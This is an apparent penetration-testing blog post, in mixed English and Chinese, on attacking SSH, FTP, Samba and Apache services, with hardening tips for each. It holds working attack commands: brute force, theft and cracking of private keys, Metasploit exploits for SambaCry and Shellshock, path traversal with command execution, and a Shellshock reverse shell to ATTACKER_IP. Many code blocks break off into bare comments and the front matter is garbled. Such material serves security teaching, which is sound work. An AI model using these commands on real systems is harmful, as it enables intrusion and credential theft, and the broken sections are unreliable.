---
title: "Linux Service Exploits - SSH, FTP, Samba, Apache Attack Surface"
url: "en/linux-service-exploitation"
date: "2026-01-12"
draft: false
summary: "Attack surface analysis of common Linux services, SSH brute force cracking, FTP anonymous access, Samba vulnerability exploitation and Apache attack practice"
authors: ["default"]
tags:
  - Linux
  - exploit
  - Service attack
images: ["https://images.unsplash.com/photo-1558494949-ef010cbdcc31?auto=formatimages: ["https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&w=1200&q=80"]fit=cropimages: ["https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&w=1200&q=80"]w=1200images: ["https://images.unsplash.com/photo-1518770660439-4636190af475?auto=format&fit=crop&w=1200&q=80"]q=80"]
categories:
  - Penetration testing
---

# Linux service exploits - SSH, FTP, Samba, Apache attack surface

During the penetration testing process, the open ports and services discovered during the information collection phase are our "entrances." Common services such as SSH, FTP, Samba, and Apache on Linux servers often become a breakthrough point for attackers to break through the defense line if they are improperly configured or have known vulnerabilities. This article will focus on these four types of common services, explaining in detail the attack surface, vulnerability exploitation methods and practical operation steps of each service. It will also give corresponding reinforcement suggestions to help you fully understand the security risks at the service level.

## Preparation

Before starting to exploit the vulnerability, assume that we have completed the target information collection through Nmap:

```bash
# 全面扫描目标主机
sudo nmap -sS -sV -sC -O -p- -T4 192.168.1.100

# 假设扫描结果如下：
# PORT     STATE  SERVICE     VERSION
# 22/tcp   open   ssh         OpenSSH 7.2p2
# 21/tcp   open   ftp         ProFTPd 1.3.5
# 139/tcp  open   netbios-ssn Samba 4.3.11
# 445/tcp  open   microsoft-ds Samba 4.3.11
# 80/tcp   open   http        Apache httpd 2.4.18
```

接下来，我们逐一对每个服务进行渗透测试。

## SSH 攻击面（端口 22）

SSH（Secure Shell）是 Linux 系统远程管理的核心服务。虽然 SSH 本身使用加密通信，但仍然存在多种攻击路径。

### 1. SSH 暴力破解

最常见的 SSH 攻击方式就是密码暴力破解，使用 Hydra 是最高效的选择。

```bash
# 使用 Hydra 对 SSH 进行暴力破解
# -l 指定用户名，-P 指定密码字典
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

# Use username list

# Limit the number of threads and waiting time (to avoid being blocked by IP)

# Specified port (non-standard port)

# Use Medusa as an alternative tool

# Use Ncrack

### 2. SSH key leakage and exploitation

If the target system's private key file is exposed due to improper configuration (for example, through a web directory or backup file), it can be directly exploited.

```bash
# 在 Web 服务器或 FTP 中发现泄露的私钥
curl http://192.168.1.100/.ssh/id_rsa -o stolen_key

# 修改私钥文件权限（SSH 要求 600 权限）
chmod 600 stolen_key

# 使用私钥登录
ssh -i stolen_key user@192.168.1.100

# 如果私钥有密码保护，使用 John 破解
ssh2john stolen_key > key_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt key_hash.txt

# 使用破解出的密码登录
ssh -i stolen_key user@192.168.1.100
```

### 3. SSH 版本漏洞

某些旧版本的 OpenSSH 存在已知漏洞：

```bash
# 确认 SSH 版本
nmap -sV -p 22 192.168.1.100
ssh -V  # 查看本地版本

# Search the corresponding version of the vulnerability in Exploit-DB

# OpenSSH 7.2p2 - Username Enumeration Vulnerability (CVE-2016-6210)

# Detect SSH vulnerabilities using Nmap NSE script

### SSH hardening recommendations

```bash
# /etc/ssh/sshd_config 关键配置
PermitRootLogin no                    # 禁止 root 远程登录
PasswordAuthentication no             # 禁用密码认证，仅允许密钥
MaxAuthTries 3                        # 最大认证尝试次数
LoginGraceTime 30                     # 登录超时时间
AllowUsers specific_user              # 仅允许特定用户
Port 2222                             # 修改默认端口
Protocol 2                            # 仅使用 SSH v2

# 安装 Fail2ban 防暴力破解
sudo apt install fail2ban
sudo systemctl enable fail2ban
```

## FTP 攻击面（端口 21）

FTP 协议本身是明文传输的，存在大量安全隐患。

### 1. FTP 匿名登录

许多 FTP 服务默认允许匿名登录，可能泄露敏感文件。

```bash
# 检查是否允许匿名登录
ftp 192.168.1.100
# 输入用户名: anonymous
# 输入密码: (空或任意邮箱)

# Detect anonymous logins using Nmap

# What to do after logging in anonymously

# Recursively download FTP content using wget

# Use lftp for more flexible operations

### 2. FTP brute force cracking

```bash
# Hydra 暴力破解 FTP
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.100

# 指定用户名列表
hydra -L users.txt -P passwords.txt ftp://192.168.1.100

# 使用 Nmap 脚本暴力破解
nmap --script ftp-brute -p 21 192.168.1.100
```

### 3. ProFTPd 漏洞利用

ProFTPd 历史上存在多个严重漏洞：

```bash
# 确认 ProFTPd 版本
nmap -sV -p 21 192.168.1.100

# Search for ProFTPd vulnerabilities

# ProFTPd 1.3.5 - Mod_Copy remote command execution

# Then access it via the web

# Even more dangerous: copying SSH private keys to a web directory

# Exploiting ProFTPd vulnerabilities using Metasploit

### FTP hardening recommendations

- If not necessary, disable the FTP service and use SFTP instead

## Samba attack surface (port 139/445)

Samba provides Windows file sharing services for Linux and is an important attack surface for intranet penetration.

### 1. Samba information enumeration

```bash
# 使用 enum4linux 进行全面枚举
enum4linux -a 192.168.1.100

# 枚举共享资源
smbclient -L //192.168.1.100 -N     # -N 表示无密码

# 使用 Nmap 脚本枚举
nmap --script smb-enum-shares -p 445 192.168.1.100
nmap --script smb-enum-users -p 445 192.168.1.100
nmap --script smb-os-discovery -p 445 192.168.1.100

# 使用 smbmap 查看共享权限
smbmap -H 192.168.1.100
smbmap -H 192.168.1.100 -u '' -p ''   # 空会话

# CrackMapExec 枚举（推荐）
crackmapexec smb 192.168.1.100 --shares
crackmapexec smb 192.168.1.100 --users
crackmapexec smb 192.168.1.100 --pass-pol
```

### 2. Samba 空会话与共享访问

```bash
# 空会话连接共享
smbclient //192.168.1.100/share -N

# Connect using credentials

# Shared operation commands

# Use mount to mount the share (convenient for batch operations)

### 3. Samba exploits

```bash
# 使用 Nmap 检测 SMB 漏洞
nmap --script smb-vuln* -p 445 192.168.1.100

# SambaCry (CVE-2017-7494) — 类似 EternalBlue 的 Linux 版本
# 影响 Samba 3.5.0 - 4.6.4
searchsploit samba 4.5

# Metasploit 利用 SambaCry
msfconsole
msf6 > use exploit/linux/samba/is_known_pipename
msf6 exploit(is_known_pipename) > set RHOSTS 192.168.1.100
msf6 exploit(is_known_pipename) > set SMB_SHARE_NAME share_name
msf6 exploit(is_known_pipename) > exploit

# Samba 暴力破解
hydra -l admin -P /usr/share/wordlists/rockyou.txt smb://192.168.1.100
crackmapexec smb 192.168.1.100 -u admin -p /usr/share/wordlists/rockyou.txt
```

### Samba 加固建议

- 禁用 SMBv1：在配置文件中添加 `min protocol = SMB2`
- 限制共享访问：设置 `valid users` 和 `hosts allow`
- 禁用空会话：`restrict anonymous = 2`
- 及时更新 Samba 版本，修补已知漏洞
- 使用防火墙限制 139/445 端口仅对内网开放

## Apache 攻击面（端口 80/443）

Apache 是最流行的 Web 服务器，其配置错误和关联组件漏洞是常见的攻击入口。

### 1. 信息收集与指纹识别

```bash
# 获取 Apache 版本和模块信息
curl -I http://192.168.1.100
nmap -sV -p 80 192.168.1.100

# Scan for web vulnerabilities with Nikto

# Identify your technology stack using WhatWeb

# Detect WAFs

# Directory enumeration

### 2. Directory traversal vulnerability

Improper configuration of Apache can allow directory traversal and reading of arbitrary files on the server.

```bash
# 基本目录遍历测试
curl http://192.168.1.100/../../../../etc/passwd
curl http://192.168.1.100/..%2f..%2f..%2f..%2fetc/passwd

# URL 编码绕过
curl "http://192.168.1.100/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# 双重编码绕过
curl "http://192.168.1.100/%252e%252e/%252e%252e/etc/passwd"

# 空字节绕过（旧版本PHP）
curl "http://192.168.1.100/page.php?file=../../../../etc/passwd%00"

# Apache 2.4.49/2.4.50 路径穿越漏洞 (CVE-2021-41773 / CVE-2021-42013)
curl "http://192.168.1.100/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"

# 利用该漏洞执行命令（需要 mod_cgi 启用）
curl "http://192.168.1.100/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
  -d "echo; id; whoami; cat /etc/passwd"
```

### 3. 文件包含漏洞（LFI/RFI）

```bash
# 本地文件包含 (LFI)
curl "http://192.168.1.100/page.php?file=/etc/passwd"
curl "http://192.168.1.100/page.php?file=../../../etc/passwd"

# Read Apache configuration and logs

# PHP pseudo-protocol exploit

# Remote file inclusion (RFI) — requires allow_url_include=On

# Log Poisoning + LFI = RCE

### 4. CGI Vulnerability — Shellshock (CVE-2014-6271)

Shellshock is a critical vulnerability in Bash that can be exploited remotely via the Apache CGI module.

```bash
# 使用 Nmap 检测 Shellshock
nmap --script http-shellshock --script-args uri=/cgi-bin/test.cgi -p 80 192.168.1.100

# 手动利用 Shellshock
curl -H "User-Agent: () { :; }; echo; /bin/cat /etc/passwd" \
  http://192.168.1.100/cgi-bin/test.cgi

# 反弹 Shell 利用
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" \
  http://192.168.1.100/cgi-bin/test.cgi

# 攻击机监听
nc -lvnp 4444

# Metasploit 利用 Shellshock
msfconsole
msf6 > use exploit/multi/http/apache_mod_cgi_bash_env_exec
msf6 exploit(apache_mod_cgi_bash_env_exec) > set RHOSTS 192.168.1.100
msf6 exploit(apache_mod_cgi_bash_env_exec) > set TARGETURI /cgi-bin/test.cgi
msf6 exploit(apache_mod_cgi_bash_env_exec) > exploit
```

### Apache 加固建议

```bash
# /etc/apache2/apache2.conf 或 httpd.conf

# Hide version information

# Disable directory browsing

# Limit HTTP methods

# Disable unnecessary modules

# Configure security headers

# Enable ModSecurity WAF

# Restart Apache

## Penetration testing complete process example

Combining the above knowledge together, a complete service vulnerability exploitation process is roughly as follows:

```bash
# 1. 端口扫描与服务识别
sudo nmap -sS -sV -sC -p- -T4 -oA target_scan 192.168.1.100

# 2. 针对发现的服务进行枚举
# FTP 匿名登录检查
nmap --script ftp-anon -p 21 192.168.1.100

# Samba 共享枚举
enum4linux -a 192.168.1.100

# Web 目录扫描
gobuster dir -u http://192.168.1.100 -w /usr/share/wordlists/dirb/common.txt

# 3. 漏洞检测
nmap --script vuln 192.168.1.100
nikto -h http://192.168.1.100

# 4. 漏洞利用（根据发现的漏洞选择对应手段）

# 5. 获取初始访问权限后进行后续渗透
```

## 总结

本文详细讲解了 Linux 环境中 SSH、FTP、Samba、Apache 四大核心服务的攻击面。从暴力破解到版本漏洞，从匿名访问到远程命令执行，每个服务都存在多种攻击路径。在渗透测试中，我们需要对目标主机上运行的每个服务都进行系统化的安全评估，不放过任何细节。同时，作为防守方，理解这些攻击手段能够帮助我们更好地加固系统、制定安全策略。下一篇文章我们将进入提权阶段——当你获取了一个低权限 Shell 后，如何一步步提升到 root 权限。

